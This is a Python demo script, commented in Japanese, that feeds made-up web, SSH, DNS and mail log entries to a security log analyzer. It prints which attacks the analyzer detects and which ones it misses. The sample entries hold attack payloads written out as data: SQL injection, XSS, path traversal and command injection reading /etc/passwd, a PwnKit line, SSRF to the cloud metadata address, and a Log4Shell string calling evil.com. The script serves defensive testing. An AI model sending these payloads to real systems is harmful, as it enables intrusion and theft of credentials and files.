#!/usr/bin/env python3
"""
analyzer.py デモ: 架空インシデントを生成して観測層の検出挙動を確認する。
- 6カテゴリそれぞれの検出例
- 閾値未満で「通過してしまう」例
- analyzerが原理的に検出できない攻撃の例
"""
import json, pathlib, tempfile, textwrap
from agent.analyzer import (
    analyze_nginx, analyze_named, analyze_secure, analyze_maillog,
    SSH_BRUTE_THRESHOLD, WEBAPP_AUTH_THRESHOLD, MAIL_BURST_THRESHOLD,
)

SEP = "=" * 70

def pp_signals(signals, label=""):
    if label:
        print(f"\n{SEP}\n  {label}\n{SEP}")
    if not signals:
        print("  → 検出なし (0 件)")
        return
    for i, s in enumerate(signals, 1):
        tag = s.evidence.get("pattern_tag", s.type)
        print(f"  [{i:2d}] severity={s.severity:<8s} type={s.type:<20s} tag={tag}")
        for k in ("ip", "count", "matched_substr", "decoded"):
            if k in s.evidence:
                print(f"       {k}={s.evidence[k]}")
    print(f"  → 合計 {len(signals)} 件検出")


# ━━━ シナリオ 1: Web攻撃 (nginx access.log JSONL) ━━━
print("\n" + "━" * 70)
print("  シナリオ 1: Web 攻撃 — SQLi / XSS / Path Traversal / CMDi / dotfile")
print("━" * 70)

web_entries = [
    # SQLi: UNION SELECT
    {"path": "/search?q=1'+UNION+SELECT+password+FROM+users--", "method": "GET",
     "ip": "192.168.1.100", "status": 200, "ts": "2026-05-03T14:00:01Z"},
    # SQLi: OR tautology
    {"path": "/login?id=1 or 1=1", "method": "GET",
     "ip": "192.168.1.100", "status": 200, "ts": "2026-05-03T14:00:02Z"},
    # XSS: script tag (URLエンコード)
    {"path": "/comment?body=%3Cscript%3Ealert(1)%3C/script%3E", "method": "POST",
     "ip": "192.168.1.101", "status": 200, "ts": "2026-05-03T14:00:03Z"},
    # Path Traversal: ../../etc/passwd
    {"path": "/download?file=../../etc/passwd", "method": "GET",
     "ip": "192.168.1.102", "status": 200, "ts": "2026-05-03T14:00:04Z"},
    # CMDi: system() (二重URLエンコード)
    {"path": "/vuln.php?cmd=%2573%2579%2573%2574%2565%256d%2528%2527id%2527%2529", "method": "GET",
     "ip": "192.168.1.103", "status": 200, "ts": "2026-05-03T14:00:05Z"},
    # CMDi: backtick
    {"path": "/api?q=`cat /etc/passwd`", "method": "GET",
     "ip": "192.168.1.103", "status": 200, "ts": "2026-05-03T14:00:06Z"},
    # dotfile: .env 直叩き
    {"path": "/.env", "method": "GET",
     "ip": "192.168.1.104", "status": 200, "ts": "2026-05-03T14:00:07Z"},
    # dotfile: .git/config
    {"path": "/.git/config", "method": "GET",
     "ip": "192.168.1.104", "status": 200, "ts": "2026-05-03T14:00:08Z"},
    # Upload PHP webshell
    {"path": "/uploads/shell.php", "method": "GET",
     "ip": "192.168.1.105", "status": 200, "ts": "2026-05-03T14:00:09Z"},
    # WAF block (403)
    {"path": "/admin/config", "method": "GET",
     "ip": "192.168.1.200", "status": 403, "ts": "2026-05-03T14:00:10Z"},
    # Scanner UA
    {"path": "/", "method": "GET", "ip": "192.168.1.201", "status": 200,
     "user_agent": "Mozilla/5.0 (compatible; Nikto/2.1.6)", "ts": "2026-05-03T14:00:11Z"},
]
pp_signals(analyze_nginx(web_entries), "1A: 単発パターンマッチ検出")


# ━━━ シナリオ 2: WP brute force — 閾値の境界 ━━━
print("\n" + "━" * 70)
print(f"  シナリオ 2: WP brute force — 閾値 = {WEBAPP_AUTH_THRESHOLD} の境界テスト")
print("━" * 70)

# 2A: 閾値未満 (9回) → brute判定されない
below = [{"path": "/wp-login.php", "method": "POST", "ip": "10.0.0.50",
          "status": 200, "ts": f"2026-05-03T14:01:{i:02d}Z"}
         for i in range(WEBAPP_AUTH_THRESHOLD - 1)]
sigs = analyze_nginx(below)
brute_sigs = [s for s in sigs if s.type == "webapp_bruteforce"]
pp_signals(brute_sigs, f"2A: POST {WEBAPP_AUTH_THRESHOLD - 1}回 (閾値未満) → brute判定")

# 2B: 閾値以上 (10回) → brute判定される
above = [{"path": "/wp-login.php", "method": "POST", "ip": "10.0.0.50",
          "status": 200, "ts": f"2026-05-03T14:01:{i:02d}Z"}
         for i in range(WEBAPP_AUTH_THRESHOLD)]
sigs = analyze_nginx(above)
brute_sigs = [s for s in sigs if s.type == "webapp_bruteforce"]
pp_signals(brute_sigs, f"2B: POST {WEBAPP_AUTH_THRESHOLD}回 (閾値以上) → brute判定")

# 2C: GETだけならbrute判定されない (POSTチェック)
get_only = [{"path": "/wp-login.php", "method": "GET", "ip": "10.0.0.50",
             "status": 200, "ts": f"2026-05-03T14:02:{i:02d}Z"}
            for i in range(20)]
sigs = analyze_nginx(get_only)
brute_sigs = [s for s in sigs if s.type == "webapp_bruteforce"]
pp_signals(brute_sigs, "2C: GET 20回 → brute判定 (POSTのみ対象)")


# ━━━ シナリオ 3: SSH brute force ━━━
print("\n" + "━" * 70)
print(f"  シナリオ 3: SSH brute force — 閾値 = {SSH_BRUTE_THRESHOLD}")
print("━" * 70)

ssh_lines_below = [
    f"May  3 14:10:{i:02d} victor sshd[{1000+i}]: Failed password for root from 203.0.113.50 port 22 ssh2"
    for i in range(SSH_BRUTE_THRESHOLD - 1)
]
pp_signals(analyze_secure(ssh_lines_below),
           f"3A: SSH fail {SSH_BRUTE_THRESHOLD - 1}回 (閾値未満)")

ssh_lines_above = [
    f"May  3 14:10:{i:02d} victor sshd[{1000+i}]: Failed password for root from 203.0.113.50 port 22 ssh2"
    for i in range(SSH_BRUTE_THRESHOLD + 3)
]
pp_signals(analyze_secure(ssh_lines_above),
           f"3B: SSH fail {SSH_BRUTE_THRESHOLD + 3}回 (閾値超)")


# ━━━ シナリオ 4: 権限昇格 (pkexec / sudo) ━━━
print("\n" + "━" * 70)
print("  シナリオ 4: 権限昇格 — PwnKit / sudo 不正")
print("━" * 70)

privesc_lines = [
    "May  3 14:15:01 bravo pkexec[9999]: user: GCONV_PATH=/tmp/lol:  Executing [/bin/sh]",
    "May  3 14:15:05 bravo sudo: hacker : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/hacker ; COMMAND=/bin/bash",
    "May  3 14:15:10 bravo sudo: attacker : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/tmp ; COMMAND=/usr/sbin/useradd",
]
pp_signals(analyze_secure(privesc_lines), "4: 権限昇格シグナル")


# ━━━ シナリオ 5: DNS 改竄 ━━━
print("\n" + "━" * 70)
print("  シナリオ 5: DNS — ゾーン転送 / 動的更新 / amplification")
print("━" * 70)

dns_lines = [
    "03-May-2026 14:20:01 client @0x7f00 10.0.0.99#12345: updating zone 'example.jp/IN': adding an RR at 'evil.example.jp' A 10.0.0.66",
    "03-May-2026 14:20:02 transfer of 'example.jp/IN' from 10.0.0.1#53: AXFR started",
    "03-May-2026 14:20:03 client @0x7f00 192.168.1.1#5353: update 'internal.local/IN' denied",
]
pp_signals(analyze_named(dns_lines), "5A: DNS 攻撃パターン")

# ANY amplification (50クエリ中30%超がANY)
dns_amp = [f"03-May-2026 14:21:{i:02d} query: example.jp IN ANY +" for i in range(20)]
dns_amp += [f"03-May-2026 14:21:{i:02d} query: example.jp IN A +" for i in range(20, 50)]
# 合計50クエリ中20がANY=40% > 30%閾値
pp_signals(analyze_named(dns_amp), "5B: DNS amplification (ANY比率 40%)")


# ━━━ シナリオ 6: メール — SASL brute / SPF fail / dovecot ━━━
print("\n" + "━" * 70)
print("  シナリオ 6: メール異常 — SASL / SPF / dovecot IMAP brute")
print("━" * 70)

mail_lines = [
    "May  3 14:25:01 bravo postfix/smtpd[1234]: warning: unknown[203.0.113.99]: SASL LOGIN authentication failed: authentication failure",
    "May  3 14:25:02 bravo postfix/smtpd[1234]: warning: unknown[203.0.113.99]: SASL PLAIN authentication failed: UGFzc3dvcmQ=",
    "May  3 14:25:03 bravo opendkim/smtpd[5678]: dkim=fail header.d=evil.com",
    "May  3 14:25:04 bravo postfix/smtpd[1234]: NOQUEUE: reject: RCPT from unknown[203.0.113.99]: Relay access denied",
    # dovecot auth fail (実際の白浜インシデントと同形式)
    "May  3 14:25:05 bravo dovecot[61589]: imap-login: Disconnected: Aborted login by logging out (auth failed, 1 attempts): user=<admin>, method=PLAIN, rip=161.33.12.212",
    "May  3 14:25:06 bravo dovecot[61589]: imap-login: Disconnected: Aborted login by logging out (auth failed, 1 attempts): user=<root>, method=PLAIN, rip=161.33.12.212",
]
pp_signals(analyze_maillog(mail_lines), "6: メール異常シグナル")


# ━━━ シナリオ 7: analyzerが「検出できない」攻撃 ━━━
print("\n" + "━" * 70)
print("  シナリオ 7: analyzer が原理的に検出できない攻撃")
print("━" * 70)

stealth = [
    # 正常に見えるログイン (credential stuffing で正規パスワード使用)
    {"path": "/wp-login.php", "method": "POST", "ip": "10.0.0.77",
     "status": 302, "ts": "2026-05-03T14:30:01Z"},
    # 正規APIを悪用 (SSRF — パターンに含まれない)
    {"path": "/api/fetch?url=http://169.254.169.254/latest/meta-data/", "method": "GET",
     "ip": "10.0.0.78", "status": 200, "ts": "2026-05-03T14:30:02Z"},
    # Log4Shell (Javaアプリ特有、nginx側にはパスに出ない場合が多い)
    {"path": "/api/search", "method": "POST", "ip": "10.0.0.79",
     "status": 200, "user_agent": "${jndi:ldap://evil.com/x}",
     "ts": "2026-05-03T14:30:03Z"},
    # 正規ユーザの内部犯行 (ログ上は正常操作)
    {"path": "/wp-admin/export.php?content=all", "method": "GET",
     "ip": "10.1.1.5", "status": 200, "ts": "2026-05-03T14:30:04Z"},
    # 低速スキャン (1エントリしかないのでpath_scanの集約閾値に達しない)
    {"path": "/secret/backup.sql", "method": "GET", "ip": "10.0.0.80",
     "status": 200, "ts": "2026-05-03T14:30:05Z"},
]
sigs = analyze_nginx(stealth)
pp_signals(sigs, "7: ステルス攻撃 (パターンに引っかからないもの)")
print(textwrap.dedent("""
    ↑ 上記 5 件の攻撃はいずれも analyzer を通過 (検出されない)
    理由:
    • Credential Stuffing: 正規パスワードなので認証成功=302。POST回数も1回で閾値未満
    • SSRF: /api/fetch?url=... はパターン定義にない
    • Log4Shell: ${jndi:...} はUA欄にあるがスキャナUAパターンにはない
    • 内部犯行: /wp-admin/export.php は正規操作と区別不能
    • 低速スキャン: 1回だけなので path_scan 閾値 (10) 未満

    → これらは判断層 (LLM) や別のセンサーが担当すべき領域
"""))

print("\n" + "━" * 70)
print("  全デモ完了")
print("━" * 70)
